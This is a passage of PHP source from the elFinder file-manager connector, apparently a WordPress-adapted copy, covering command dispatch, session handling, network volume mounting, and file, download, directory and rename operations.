                            $this->removeNetVolume($i, $volume);
                        }
                        $this->mountErrors[] = 'Driver "' . $class . '" : ' . implode(' ', $volume->error());
                    }
                } catch (Exception $e) {
                    if (!empty($o['_isNetVolume'])) {
                        $this->removeNetVolume($i, $volume);
                    }
                    $this->mountErrors[] = 'Driver "' . $class . '" : ' . $e->getMessage();
                }
            } else {
                if (!empty($o['_isNetVolume'])) {
                    $this->removeNetVolume($i, $volume);
                }
                $this->mountErrors[] = 'Driver "' . $class . '" does not exist';
            }
        }

        $this->loaded = !empty($this->default);
        restore_error_handler();
    }

    public function getSession() { return $this->session; }
    public function loaded() { return $this->loaded; }
    public function version() { return self::$ApiVersion; }
    public function revision() { return self::$ApiRevision; }

    public function bind($cmd, $handler)
    {
        $allCmds = array_keys($this->commands);
        $cmds = array();
        foreach (explode(' ', $cmd) as $_cmd) {
            if ($_cmd !== '') {
                if ($all = strpos($_cmd, '*') !== false) {
                    list(, $sub) = array_pad(explode('.', $_cmd), 2, '');
                    if ($sub) {
                        $sub = str_replace('\'', '\\\'', $sub);
                        $subs = array_fill(0, count($allCmds), $sub);
                        $cmds = array_merge($cmds, array_map(array('elFinder', 'addSubToBindName'), $allCmds, $subs));
                    } else {
                        $cmds = array_merge($cmds, $allCmds);
                    }
                } else {
                    $cmds[] = $_cmd;
                }
            }
        }
        $cmds = array_unique($cmds);
        foreach ($cmds as $cmd) {
            if (!isset($this->listeners[$cmd])) {
                $this->listeners[$cmd] = array();
            }
            if (is_callable($handler)) {
                $this->listeners[$cmd][] = $handler;
            }
        }
        return $this;
    }

    public function unbind($cmd, $handler)
    {
        if (!empty($this->listeners[$cmd])) {
            foreach ($this->listeners[$cmd] as $i => $h) {
                if ($h === $handler) {
                    unset($this->listeners[$cmd][$i]);
                    return $this;
                }
            }
        }
        return $this;
    }

    public function trigger($cmd, $vars, &$errors)
    {
        if (!empty($this->listeners[$cmd])) {
            foreach ($this->listeners[$cmd] as $handler) {
                $_res = call_user_func_array($handler, $vars);
                if ($_res && is_array($_res)) {
                    $_err = !empty($_res['error'])? $_res['error'] : (!empty($_res['warning'])? $_res['warning'] : null);
                    if ($_err) {
                        if (is_array($_err)) {
                            $errors = array_merge($errors, $_err);
                        } else {
                            $errors[] = (string)$_err;
                        }
                        if ($_res['error']) {
                            throw new elFinderTriggerException();
                        }
                    }
                }
            }
        }
    }

    public function commandExists($cmd)
    {
        return $this->loaded && isset($this->commands[$cmd]) && method_exists($this, $cmd);
    }

    public function getVolume($hash) { return $this->volume($hash); }

    public function commandArgsList($cmd)
    {
        if ($this->commandExists($cmd)) {
            $list = $this->commands[$cmd];
            $list['reqid'] = false;
        } else {
            $list = array();
        }
        return $list;
    }

    private function session_expires()
    {
        if (!$last = $this->session->get(':LAST_ACTIVITY')) {
            $this->session->set(':LAST_ACTIVITY', time());
            return false;
        }
        if (($this->timeout > 0) && (time() - $last > $this->timeout)) {
            return true;
        }
        $this->session->set(':LAST_ACTIVITY', time());
        return false;
    }

    public function exec($cmd, $args)
    {
        set_error_handler('elFinder::phpErrorHandler', E_WARNING | E_NOTICE | E_USER_WARNING | E_USER_NOTICE);
        self::$currentArgs = $args;
        if (!$this->loaded) {
            return array('error' => $this->error(self::ERROR_CONF, self::ERROR_CONF_NO_VOL));
        }
        if ($this->session_expires()) {
            return array('error' => $this->error(self::ERROR_SESSION_EXPIRES));
        }
        if (!$this->commandExists($cmd)) {
            return array('error' => $this->error(self::ERROR_UNKNOWN_CMD));
        }

        $args['reqid'] = preg_replace('[^0-9a-fA-F]', '', !empty($args['reqid']) ? $args['reqid'] : (!empty($_SERVER['HTTP_X_ELFINDERREQID']) ? $_SERVER['HTTP_X_ELFINDERREQID'] : ''));

        if ($cmd === 'abort') {
            $this->abort($args);
            return array('error' => 0);
        }

        if ($args['reqid']) {
            $this->abort(array('makeFile' => $args['reqid']));
        }

        if (!empty($args['mimes']) && is_array($args['mimes'])) {
            foreach ($this->volumes as $id => $v) {
                $this->volumes[$id]->setMimesFilter($args['mimes']);
            }
        }

        register_shutdown_function(array($this, 'itemAutoUnlock'));

        $dstVolume = false;
        $dst = !empty($args['target']) ? $args['target'] : (!empty($args['dst']) ? $args['dst'] : '');
        if ($dst) {
            $dstVolume = $this->volume($dst);
        } else if (isset($args['targets']) && is_array($args['targets']) && isset($args['targets'][0])) {
            $dst = $args['targets'][0];
            $dstVolume = $this->volume($dst);
            if ($dstVolume && ($_stat = $dstVolume->file($dst)) && !empty($_stat['phash'])) {
                $dst = $_stat['phash'];
            } else {
                $dst = '';
            }
        } else if ($cmd === 'open') {
            $dstVolume = $this->default;
            $dst = $dstVolume->defaultPath();
        }

        $result = null;
        $args['sessionCloseEarlier'] = isset($this->sessionUseCmds[$cmd]) ? false : $this->sessionCloseEarlier;
        if (!empty($this->listeners[$cmd . '.pre'])) {
            foreach ($this->listeners[$cmd . '.pre'] as $handler) {
                $_res = call_user_func_array($handler, array($cmd, &$args, $this, $dstVolume));
                if (is_array($_res)) {
                    if (!empty($_res['preventexec'])) {
                        $result = array('error' => true);
                        if ($cmd === 'upload' && !empty($args['node'])) {
                            $result['callback'] = array('node' => $args['node'], 'bind' => $cmd);
                        }
                        if (!empty($_res['results']) && is_array($_res['results'])) {
                            $result = array_merge($result, $_res['results']);
                        }
                        break;
                    }
                }
            }
        }

        if ($this->sessionCloseEarlier && $args['sessionCloseEarlier']) {
            $this->session->close();
            elFinder::$sessionClosed = true;
        }

        if (substr(PHP_OS, 0, 3) === 'WIN') {
            elFinder::extendTimeLimit(300);
        }

        if (!is_array($result)) {
            try {
                $result = $this->$cmd($args);
            } catch (elFinderAbortException $e) {
                throw $e;
            } catch (Exception $e) {
                $error_res = json_decode($e->getMessage());
                $message = isset($error_res->error->message) ? $error_res->error->message : $e->getMessage();
                $result = array('error' => htmlspecialchars($message), 'sync' => true);
                if ($this->throwErrorOnExec) {
                    throw $e;
                }
            }
        }

        $changeDst = false;
        if ($dst && $dstVolume && (!empty($result['added']) || !empty($result['removed']))) {
            $changeDst = true;
        }

        foreach ($this->volumes as $volume) {
            $removed = $volume->removed();
            if (!empty($removed)) {
                if (!isset($result['removed'])) {
                    $result['removed'] = array();
                }
                $result['removed'] = array_merge($result['removed'], $removed);
                if (!$changeDst && $dst && $dstVolume && $volume === $dstVolume) {
                    $changeDst = true;
                }
            }
            $added = $volume->added();
            if (!empty($added)) {
                if (!isset($result['added'])) {
                    $result['added'] = array();
                }
                $result['added'] = array_merge($result['added'], $added);
                if (!$changeDst && $dst && $dstVolume && $volume === $dstVolume) {
                    $changeDst = true;
                }
            }
            $volume->resetResultStat();
        }

        if ($changeDst) {
            if ($dstDir = $dstVolume->dir($dst)) {
                if (!isset($result['changed'])) {
                    $result['changed'] = array();
                }
                $result['changed'][] = $dstDir;
            }
        }

        if (!empty($this->listeners[$cmd])) {
            foreach ($this->listeners[$cmd] as $handler) {
                if (call_user_func_array($handler, array($cmd, &$result, $args, $this, $dstVolume))) {
                    $result['sync'] = true;
                }
            }
        }

        if (!empty($result['removed'])) {
            $removed = array();
            foreach ($result['removed'] as $file) {
                $removed[] = $file['hash'];
            }
            $result['removed'] = array_unique($removed);
        }
        if (!empty($result['added'])) {
            $result['added'] = $this->filter($result['added']);
        }
        if (!empty($result['changed'])) {
            $result['changed'] = $this->filter($result['changed']);
        }
        if ($this->toastMessages) {
            $result['toasts'] = array_merge(((isset($result['toasts']) && is_array($result['toasts']))? $result['toasts'] : array()), $this->toastMessages);
        }

        if ($this->debug || !empty($args['debug'])) {
            $result['debug'] = array(
                'connector' => 'php',
                'phpver' => PHP_VERSION,
                'time' => $this->utime() - $this->time,
                'memory' => (function_exists('memory_get_peak_usage') ? ceil(memory_get_peak_usage() / 1024) . 'Kb / ' : '') . ceil(memory_get_usage() / 1024) . 'Kb / ' . ini_get('memory_limit'),
                'upload' => $this->uploadDebug,
                'volumes' => array(),
                'mountErrors' => $this->mountErrors
            );
            foreach ($this->volumes as $id => $volume) {
                $result['debug']['volumes'][] = $volume->debug();
            }
        }

        if ($this->removeContentSaveIds) {
            $urlContentSaveIds = $this->session->get('urlContentSaveIds', array());
            foreach (array_keys($this->removeContentSaveIds) as $contentSaveId) {
                if (isset($urlContentSaveIds[$contentSaveId])) {
                    unset($urlContentSaveIds[$contentSaveId]);
                }
            }
            if ($urlContentSaveIds) {
                $this->session->set('urlContentSaveIds', $urlContentSaveIds);
            } else {
                $this->session->remove('urlContentSaveIds');
            }
        }

        foreach ($this->volumes as $volume) {
            $volume->saveSessionCache();
            $volume->umount();
        }

        $this->itemAutoUnlock();

        if ($this->customData !== null) {
            $result['customData'] = $this->customData ? json_encode($this->customData) : '';
        }

        if (!empty($result['debug'])) {
            $result['debug']['backendErrors'] = elFinder::$phpErrors;
        }
        elFinder::$phpErrors = array();
        restore_error_handler();

        if (!empty($result['callback'])) {
            $result['callback']['json'] = json_encode($result);
            $this->callback($result['callback']);
            return array();
        } else {
            return $result;
        }
    }

    public function realpath($hash)
    {
        if (($volume = $this->volume($hash)) == false) {
            return false;
        }
        return $volume->realpath($hash);
    }

    public function setCustomData($key, $val = null)
    {
        if (is_array($key)) {
            foreach ($key as $k => $v) {
                $this->customData[$k] = $v;
            }
        } else {
            $this->customData[$key] = $val;
        }
        return $this;
    }

    public function removeCustomData($key)
    {
        $this->customData[$key] = null;
        return $this;
    }

    public function updateNetVolumeOption($netKey, $optionKey, $val)
    {
        $netVolumes = $this->getNetVolumes();
        if (is_string($netKey) && isset($netVolumes[$netKey]) && is_string($optionKey)) {
            $netVolumes[$netKey][$optionKey] = $val;
            $this->saveNetVolumes($netVolumes);
            return true;
        }
        return false;
    }

    public function removeUrlContentSaveId($id)
    {
        $this->removeContentSaveIds[$id] = true;
    }

    protected function getNetVolumes()
    {
        if ($data = $this->session->get('netvolume', array())) {
            return $data;
        }
        return array();
    }

    protected function saveNetVolumes($volumes)
    {
        $this->session->set('netvolume', $volumes);
    }

    protected function removeNetVolume($key, $volume)
    {
        $netVolumes = $this->getNetVolumes();
        $res = true;
        if (is_object($volume) && method_exists($volume, 'netunmount')) {
            $res = $volume->netunmount($netVolumes, $key);
            $volume->clearSessionCache();
        }
        if ($res) {
            if (is_string($key) && isset($netVolumes[$key])) {
                unset($netVolumes[$key]);
                $this->saveNetVolumes($netVolumes);
                return true;
            }
        }
        return false;
    }

    protected function getPluginInstance($name, $opts = array())
    {
        $key = strtolower($name);
        if (!isset($this->plugins[$key])) {
            $class = 'elFinderPlugin' . $name;
            if (!class_exists($class)) {
                $p_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'plugins' . DIRECTORY_SEPARATOR . $name . DIRECTORY_SEPARATOR . 'plugin.php';
                if (is_file($p_file)) {
                    include_once $p_file;
                }
            }
            if (class_exists($class, false)) {
                $this->plugins[$key] = new $class($opts);
            } else {
                $this->plugins[$key] = false;
            }
        }
        return $this->plugins[$key];
    }

    public function error()
    {
        $errors = array();
        foreach (func_get_args() as $msg) {
            if (is_array($msg)) {
                $errors = array_merge($errors, $msg);
            } else {
                $errors[] = $msg;
            }
        }
        return count($errors) ? $errors : array(self::ERROR_UNKNOWN);
    }

    protected function netmount($args)
    {
        $options = array();
        $protocol = $args['protocol'];
        $toast = '';
        if ($protocol === 'netunmount') {
            if (!empty($args['user']) && $volume = $this->volume($args['user'])) {
                if ($this->removeNetVolume($args['host'], $volume)) {
                    return array('removed' => array(array('hash' => $volume->root())));
                }
            }
            return array('sync' => true, 'error' => $this->error(self::ERROR_NETUNMOUNT));
        }
        $driver = isset(self::$netDrivers[$protocol]) ? self::$netDrivers[$protocol] : '';
        $class = 'elFinderVolume' . $driver;
        if (!class_exists($class)) {
            return array('error' => $this->error(self::ERROR_NETMOUNT, $args['host'], self::ERROR_NETMOUNT_NO_DRIVER));
        }
        if (!$args['path']) {
            $args['path'] = '/';
        }
        foreach ($args as $k => $v) {
            if ($k != 'options' && $k != 'protocol' && $v) {
                $options[$k] = $v;
            }
        }
        if (is_array($args['options'])) {
            foreach ($args['options'] as $key => $value) {
                $options[$key] = $value;
            }
        }
        $volume = new $class();
        $volume->setSession($this->session);
        $volume->setNeedOnline(true);
        if (is_callable(array($volume, 'netmountPrepare'))) {
            $options = $volume->netmountPrepare($options);
            if (isset($options['exit'])) {
                if ($options['exit'] === 'callback') {
                    $this->callback($options['out']);
                }
                return $options;
            }
            if (!empty($options['toast'])) {
                $toast = $options['toast'];
                unset($options['toast']);
            }
        }
        $netVolumes = $this->getNetVolumes();
        if (!isset($options['id'])) {
            if (!$options['id'] = $this->getNetVolumeUniqueId($netVolumes)) {
                return array('error' => $this->error(self::ERROR_NETMOUNT, $args['host'], 'Could\'t given volume id.'));
            }
        }
        if (!empty($this->optionsNetVolumes['*'])) {
            $options = array_merge($this->optionsNetVolumes['*'], $options);
        }
        if (!empty($this->optionsNetVolumes[$protocol])) {
            $options = array_merge($this->optionsNetVolumes[$protocol], $options);
        }
        if (!$key = $volume->netMountKey) {
            $key = md5($protocol . '-' . serialize($options));
        }
        $options['netkey'] = $key;
        if (!isset($netVolumes[$key]) && $volume->mount($options)) {
            if (is_callable(array($volume, 'postNetmount'))) {
                $volume->postNetmount($options);
            }
            $options['driver'] = $driver;
            $netVolumes[$key] = $options;
            $this->saveNetVolumes($netVolumes);
            $rootstat = $volume->file($volume->root());
            $res = array('added' => array($rootstat));
            if ($toast) {
                $res['toast'] = $toast;
            }
            return $res;
        } else {
            $this->removeNetVolume(null, $volume);
            return array('error' => $this->error(self::ERROR_NETMOUNT, $args['host'], implode(' ', $volume->error())));
        }
    }

    protected function open($args)
    {
        $target = $args['target'];
        $init = !empty($args['init']);
        $tree = !empty($args['tree']);
        $volume = $this->volume($target);
        $cwd = $volume ? $volume->dir($target) : false;
        $hash = $init ? 'default folder' : '#' . $target;
        $compare = '';

        if ((!$cwd || !$cwd['read']) && $init) {
            $volume = $this->default;
            $target = $volume->defaultPath();
            $cwd = $volume->dir($target);
        }
        if (!$cwd) {
            return array('error' => $this->error(self::ERROR_OPEN, $hash, self::ERROR_DIR_NOT_FOUND));
        }
        if (!$cwd['read']) {
            return array('error' => $this->error(self::ERROR_OPEN, $hash, self::ERROR_PERM_DENIED));
        }
        $files = array();
        if (($ls = $volume->scandir($cwd['hash'])) === false) {
            return array('error' => $this->error(self::ERROR_OPEN, $cwd['name'], $volume->error()));
        }
        if (isset($cwd['dirs']) && $cwd['dirs'] != 1) {
            $cwd = $volume->dir($target);
        }
        if ($tree) {
            foreach ($this->volumes as $id => $v) {
                $files[] = $v->file($v->root());
            }
        }
        if ($args['compare']) {
            $sleep = max(1, (int)$volume->getOption('lsPlSleep'));
            $standby = (int)$volume->getOption('plStandby');
            if ($standby > 0 && $sleep > $standby) {
                $standby = $sleep;
            }
            $limit = max(0, floor($standby / $sleep)) + 1;
            do {
                elFinder::extendTimeLimit(30 + $sleep);
                $_mtime = 0;
                foreach ($ls as $_f) {
                    if (isset($_f['ts'])) {
                        $_mtime = max($_mtime, $_f['ts']);
                    }
                }
                $compare = strval(count($ls)) . ':' . strval($_mtime);
                if ($compare !== $args['compare']) {
                    break;
                }
                if (--$limit) {
                    sleep($sleep);
                    $volume->clearstatcache();
                    if (($ls = $volume->scandir($cwd['hash'])) === false) {
                        break;
                    }
                }
            } while ($limit);
            if ($ls === false) {
                return array('error' => $this->error(self::ERROR_OPEN, $cwd['name'], $volume->error()));
            }
        }
        if ($ls) {
            if ($files) {
                $files = array_merge($files, $ls);
            } else {
                $files = $ls;
            }
        }
        $result = array(
            'cwd' => $cwd,
            'options' => $volume->options($cwd['hash']),
            'files' => $files
        );
        if ($compare) {
            $result['cwd']['compare'] = $compare;
        }
        if (!empty($args['init'])) {
            $result['api'] = sprintf('%.1F%03d', self::$ApiVersion, self::$ApiRevision);
            $result['uplMaxSize'] = ini_get('upload_max_filesize');
            $result['uplMaxFile'] = ini_get('max_file_uploads');
            $result['netDrivers'] = array_keys(self::$netDrivers);
            $result['maxTargets'] = $this->maxTargets;
            if ($volume) {
                $result['cwd']['root'] = $volume->root();
            }
            if (elfinder::$textMimes) {
                $result['textMimes'] = elfinder::$textMimes;
            }
        }
        return $result;
    }

    protected function ls($args)
    {
        $target = $args['target'];
        $intersect = isset($args['intersect']) ? $args['intersect'] : array();
        if (($volume = $this->volume($target)) == false
            || ($list = $volume->ls($target, $intersect)) === false) {
            return array('error' => $this->error(self::ERROR_OPEN, '#' . $target));
        }
        return array('list' => $list);
    }

    protected function tree($args)
    {
        $target = $args['target'];
        if (($volume = $this->volume($target)) == false
            || ($tree = $volume->tree($target)) == false) {
            return array('error' => $this->error(self::ERROR_OPEN, '#' . $target));
        }
        return array('tree' => $tree);
    }

    protected function parents($args)
    {
        $target = $args['target'];
        $until = $args['until'];
        if (($volume = $this->volume($target)) == false
            || ($tree = $volume->parents($target, false, $until)) == false) {
            return array('error' => $this->error(self::ERROR_OPEN, '#' . $target));
        }
        return array('tree' => $tree);
    }

    protected function tmb($args)
    {
        $result = array('images' => array());
        $targets = $args['targets'];
        foreach ($targets as $target) {
            elFinder::checkAborted();
            if (($volume = $this->volume($target)) != false
                && (($tmb = $volume->tmb($target)) != false)) {
                $result['images'][$target] = $tmb;
            }
        }
        return $result;
    }

    protected function zipdl($args)
    {
        $targets = $args['targets'];
        $download = !empty($args['download']);
        $h404 = 'HTTP/1.x 404 Not Found';
        $CriOS = isset($_SERVER['HTTP_USER_AGENT'])? (strpos($_SERVER['HTTP_USER_AGENT'], 'CriOS') !== false) : false;
        if (!$download) {
            $error = array(self::ERROR_ARCHIVE);
            if (($volume = $this->volume($targets[0])) !== false) {
                if ($dlres = $volume->zipdl($targets)) {
                    $path = $dlres['path'];
                    register_shutdown_function(array('elFinder', 'rmFileInDisconnected'), $path);
                    if (count($targets) === 1) {
                        $name = basename($volume->path($targets[0]));
                    } else {
                        $name = $dlres['prefix'] . '_Files';
                    }
                    $name .= '.' . $dlres['ext'];
                    $uniqid = uniqid();
                    if(ZEND_THREAD_SAFE){
                        set_transient("zipdl$uniqid", basename($path), MINUTE_IN_SECONDS);
                    } else {
                        $this->session->set('zipdl' . $uniqid, basename($path));
                    }
                    $result = array('zipdl' => array(
                        'file' => $CriOS? basename($path) : $uniqid,
                        'name' => $name,
                        'mime' => $dlres['mime']
                    ));
                    return $result;
                }
                $error = array_merge($error, $volume->error());
            }
            return array('error' => $error);
        } else {
            $CriOSinit = false;
            if ($CriOS) {
                $accept = isset($_SERVER['HTTP_ACCEPT'])? $_SERVER['HTTP_ACCEPT'] : '';
                if ($accept && $accept !== '*' && $accept !== '*/*') {
                    $CriOSinit = true;
                }
            }
            if (count($targets) !== 4 || ($volume = $this->volume($targets[0])) == false || !($file = $CriOS? $targets[1] : ( ZEND_THREAD_SAFE ? get_transient("zipdl$targets[1]") : $this->session->get('zipdl' . $targets[1] ) ) )) {
                return array('error' => 'File not found', 'header' => $h404, 'raw' => true);
            }
            $path = $volume->getTempPath() . DIRECTORY_SEPARATOR . basename($file);
            if(ZEND_THREAD_SAFE){
                delete_transient("zipdl$targets[1]");
            } else {
                $this->session->remove('zipdl' . $targets[1]);
            }
            if (!$CriOSinit) {
                $GLOBALS['elFinderTempFiles'][$path] = true;
            }
            if ($volume->commandDisabled('zipdl')) {
                return array('error' => 'File not found', 'header' => $h404, 'raw' => true);
            }
            if (!is_readable($path) || !is_writable($path)) {
                return array('error' => 'File not found', 'header' => $h404, 'raw' => true);
            }
            $name = $targets[2];
            $mime = $targets[3];
            $filenameEncoded = rawurlencode($name);
            if (strpos($filenameEncoded, '%') === false) {
                $filename = 'filename="' . $name . '"';
            } else {
                $ua = $_SERVER['HTTP_USER_AGENT'];
                if (preg_match('/MSIE [4-8]/', $ua)) {
                    $filename = 'filename="' . $filenameEncoded . '"';
                } elseif (strpos($ua, 'Chrome') === false && strpos($ua, 'Safari') !== false && preg_match('#Version/[3-5]#', $ua)) {
                    $filename = 'filename="' . str_replace('"', '', $name) . '"';
                } else {
                    $filename = 'filename*=UTF-8\'\'' . $filenameEncoded;
                }
            }
            $fp = fopen($path, 'rb');
            $file = fstat($fp);
            $result = array(
                'pointer' => $fp,
                'header' => array(
                    'Content-Type: ' . $mime,
                    'Content-Disposition: attachment; ' . $filename,
                    'Content-Transfer-Encoding: binary',
                    'Content-Length: ' . $file['size'],
                    'Accept-Ranges: none',
                    'Connection: close'
                )
            );
            if ($cacheHeaders = $volume->getOption('cacheHeaders')) {
                $result['header'] = array_merge($result['header'], $cacheHeaders);
            }
            return $result;
        }
    }

    protected function file($args)
    {
        $target = $args['target'];
        $download = !empty($args['download']);
        $onetime = !empty($args['onetime']);
        $h403 = 'HTTP/1.0 403 Access Denied';
        $a403 = array('error' => 'Access Denied', 'header' => $h403, 'raw' => true);
        $h404 = 'HTTP/1.0 404 Not Found';
        $a404 = array('error' => 'File not found', 'header' => $h404, 'raw' => true);
        if ($onetime) {
            $volume = null;
            $tmpdir = elFinder::$commonTempPath;
            if (!$tmpdir || !is_file($tmpf = $tmpdir . DIRECTORY_SEPARATOR . 'ELF' . $target)) {
                return $a404;
            }
            $GLOBALS['elFinderTempFiles'][$tmpf] = true;
            if ($file = json_decode(file_get_contents($tmpf), true)) {
                $src = base64_decode($file['file']);
                if (!is_file($src) || !($fp = fopen($src, 'rb'))) {
                    return $a404;
                }
                if (strpos($src, $tmpdir) === 0) {
                    $GLOBALS['elFinderTempFiles'][$src] = true;
                }
                unset($file['file']);
                $file['read'] = true;
                $file['size'] = filesize($src);
            } else {
                return $a404;
            }
        } else {
            if (($volume = $this->volume($target)) == false) {
                return $a404;
            }
            if ($volume->commandDisabled('file')) {
                return $a403;
            }
            if (($file = $volume->file($target)) == false) {
                return $a404;
            }
            if (!$file['read']) {
                return $a404;
            }
            $opts = array();
            if (!empty($_SERVER['HTTP_RANGE'])) {
                $opts['httpheaders'] = array('Range: ' . $_SERVER['HTTP_RANGE']);
            }
            if (($fp = $volume->open($target, $opts)) == false) {
                return $a404;
            }
        }
        elFinder::checkAborted();
        $mime = isset($args['mime']) ? $args['mime'] : $file['mime'];
        if ($download || $onetime) {
            $disp = 'attachment';
        } else {
            $dispInlineRegex = $volume->getOption('dispInlineRegex');
            $inlineRegex = false;
            if ($dispInlineRegex) {
                $inlineRegex = '#' . str_replace('#', '\\#', $dispInlineRegex) . '#';
                try {
                    preg_match($inlineRegex, '');
                } catch (Exception $e) {
                    $inlineRegex = false;
                }
            }
            if (!$inlineRegex) {
                $inlineRegex = '#^(?:(?:image|text)|application/x-shockwave-flash$)#';
            }
            $disp = preg_match($inlineRegex, $mime) ? 'inline' : 'attachment';
        }
        $filenameEncoded = rawurlencode($file['name']);
        if (strpos($filenameEncoded, '%') === false) {
            $filename = 'filename="' . $file['name'] . '"';
        } else {
            $ua = isset($_SERVER['HTTP_USER_AGENT'])? $_SERVER['HTTP_USER_AGENT'] : '';
            if (preg_match('/MSIE [4-8]/', $ua)) {
                $filename = 'filename="' . $filenameEncoded . '"';
            } elseif (strpos($ua, 'Chrome') === false && strpos($ua, 'Safari') !== false && preg_match('#Version/[3-5]#', $ua)) {
                $filename = 'filename="' . str_replace('"', '', $file['name']) . '"';
            } else {
                $filename = 'filename*=UTF-8\'\'' . $filenameEncoded;
            }
        }
        if ($args['cpath'] && $args['reqid']) {
            setcookie('elfdl' . $args['reqid'], '1', 0, $args['cpath']);
        }
        $result = array(
            'volume' => $volume,
            'pointer' => $fp,
            'info' => $file,
            'header' => array(
                'Content-Type: ' . $mime,
                'Content-Disposition: ' . $disp . '; ' . $filename,
                'Content-Transfer-Encoding: binary',
                'Content-Length: ' . $file['size'],
                'Last-Modified: ' . gmdate('D, d M Y H:i:s T', $file['ts']),
                'Connection: close'
            )
        );
        if (!$onetime) {
            if ($cacheHeaders = $volume->getOption('cacheHeaders')) {
                $result['header'] = array_merge($result['header'], $cacheHeaders);
            }
            $xsendfile = $volume->getOption('xsendfile');
            $path = null;
            if ($xsendfile) {
                $info = stream_get_meta_data($fp);
                if ($path = empty($info['uri']) ? null : $info['uri']) {
                    $basePath = rtrim($volume->getOption('xsendfilePath'), DIRECTORY_SEPARATOR);
                    if ($basePath) {
                        $root = rtrim($volume->getRootPath(), DIRECTORY_SEPARATOR);
                        if (strpos($path, $root) === 0) {
                            $path = $basePath . substr($path, strlen($root));
                        } else {
                            $path = null;
                        }
                    }
                }
            }
            if ($path) {
                $result['header'][] = $xsendfile . ': ' . $path;
                $result['info']['xsendfile'] = $xsendfile;
            }
        }
        if (isset($file['url']) && $file['url'] && $file['url'] != 1) {
            $result['header'][] = 'Content-Location: ' . $file['url'];
        }
        return $result;
    }

    protected function size($args)
    {
        $size = 0;
        $files = 0;
        $dirs = 0;
        $itemCount = true;
        $sizes = array();
        foreach ($args['targets'] as $target) {
            elFinder::checkAborted();
            if (($volume = $this->volume($target)) == false
                || ($file = $volume->file($target)) == false
                || !$file['read']) {
                return array('error' => $this->error(self::ERROR_OPEN, '#' . $target));
            }
            $volRes = $volume->size($target);
            if (is_array($volRes)) {
                $sizeInfo = array('size' => 0, 'fileCnt' => 0, 'dirCnt' => 0);
                if (!empty($volRes['size'])) {
                    $sizeInfo['size'] = $volRes['size'];
                    $size += $volRes['size'];
                }
                if (!empty($volRes['files'])) {
                    $sizeInfo['fileCnt'] = $volRes['files'];
                }
                if (!empty($volRes['dirs'])) {
                    $sizeInfo['dirCnt'] = $volRes['dirs'];
                }
                if ($itemCount) {
                    $files += $sizeInfo['fileCnt'];
                    $dirs += $sizeInfo['dirCnt'];
                }
                $sizes[$target] = $sizeInfo;
            } else if (is_numeric($volRes)) {
                $size += $volRes;
                $files = $dirs = 'unknown';
                $itemCount = false;
            }
        }
        return array('size' => $size, 'fileCnt' => $files, 'dirCnt' => $dirs, 'sizes' => $sizes);
    }

    protected function mkdir($args)
    {
        $target = $args['target'];
        $name = $args['name'];
        $dirs = $args['dirs'];
        if ($name === '' && !$dirs) {
            return array('error' => $this->error(self::ERROR_INV_PARAMS, 'mkdir'));
        }
        if (strpos($name,'..') !== false) {
            return array('error' => $this->error('Invalid request', 'mkdir'));
        }
        if (($volume = $this->volume($target)) == false) {
            return array('error' => $this->error(self::ERROR_MKDIR, $name, self::ERROR_TRGDIR_NOT_FOUND, '#' . $target));
        }
        if ($dirs) {
            $maxDirs = $volume->getOption('uploadMaxMkdirs');
            if ($maxDirs && $maxDirs < count($dirs)) {
                return array('error' => $this->error(self::ERROR_MAX_MKDIRS, $maxDirs));
            }
            sort($dirs);
            $reset = null;
            $mkdirs = array();
            foreach ($dirs as $dir) {
                if(strpos($dir,'..') !== false){
                    return array('error' => $this->error('Invalid request', 'mkdir'));
                }
                $tgt =& $mkdirs;
                $_names = explode('/', trim($dir, '/'));
                foreach ($_names as $_key => $_name) {
                    if (!isset($tgt[$_name])) {
                        $tgt[$_name] = array();
                    }
                    $tgt =& $tgt[$_name];
                }
                $tgt =& $reset;
            }
            $res = $this->ensureDirsRecursively($volume, $target, $mkdirs);
            $ret = array('added' => $res['stats'], 'hashes' => $res['hashes']);
            if ($res['error']) {
                $ret['warning'] = $this->error(self::ERROR_MKDIR, $res['error'][0], $volume->error());
            }
            return $ret;
        } else {
            return ($dir = $volume->mkdir($target, $name)) == false
                ? array('error' => $this->error(self::ERROR_MKDIR, $name, $volume->error()))
                : array('added' => array($dir));
        }
    }

    protected function mkfile($args)
    {
        $target = $args['target'];
        $name = str_replace('..', '', $args['name']);
        if (($volume = $this->volume($target)) == false) {
            return array('error' => $this->error(self::ERROR_MKFILE, $name, self::ERROR_TRGDIR_NOT_FOUND, '#' . $target));
        }
        return ($file = $volume->mkfile($target, $name)) == false
            ? array('error' => $this->error(self::ERROR_MKFILE, $name, $volume->error()))
            : array('added' => array($file));
    }

    protected function rename($args)
    {
        $target = $args['target'];
        $name = $args['name'];
        $query = (!empty($args['q']) && strpos($args['q'], '*') !== false) ? $args['q'] : '';
        $targets = !empty($args['targets'])? $args['targets'] : false;
        $rms = array();
        $notfounds = array();
        $locked = array();
        $errs = array();
        $files = array();
        $removed = array();
        $res = array();
        $type = 'normal';
        if (!($volume = $this->volume($target))) {
            return array('error' => $this->error(self::ERROR_RENAME, '#' . $target, self::ERROR_FILE_NOT_FOUND));
        }
        if (strpos($name,'..') !== false) {
            return array('error' => $this->error('Invalid request', 'rename'));
        }
        if ($targets) {
            array_unshift($targets, $target);
            foreach ($targets as $h) {
                if ($rm = $volume->file($h)) {
                    if ($this->itemLocked($h)) {
                        $locked[] = $rm['name'];
                    } else {
                        $rm['realpath'] = $volume->realpath($h);
                        $rms[] = $rm;
                    }
                } else {
                    $notfounds[] = '#' . $h;
                }
            }
            if (!$rms) {
                $res['error'] = array();
                if ($notfounds) {
                    $res['error'] = array(self::ERROR_RENAME, join(', ', $notfounds), self::ERROR_FILE_NOT_FOUND);
                }
                if ($locked) {
                    array_push($res['error'], self::ERROR_LOCKED, join(', ', $locked));
                }
                return $res;
            }
            $res['warning'] = array();
            if ($notfounds) {
                array_push($res['warning'], self::ERROR_RENAME, join(', ', $notfounds), self::ERROR_FILE_NOT_FOUND);
            }
            if ($locked) {
                array_push($res['warning'], self::ERROR_LOCKED, join(', ', $locked));
            }
            if ($query) {
                $splits = elFinder::splitFileExtention($query);
                if ($splits[1] && $splits[0] === '*') {
                    $type = 'extention';
                    $name = $splits[1];
                } else if (strlen($splits[0]) > 1) {
                    if (substr($splits[0], -1) === '*') {
                        $type = 'prefix';
                        $name = substr($splits[0], 0, strlen($splits[0]) - 1);
                    } else if (substr($splits[0], 0, 1) === '*') {
                        $type = 'suffix';
                        $name = substr($splits[0], 1);
                    }
                }
                if ($type !== 'normal') {
                    if (!empty($this->listeners['rename.pre'])) {
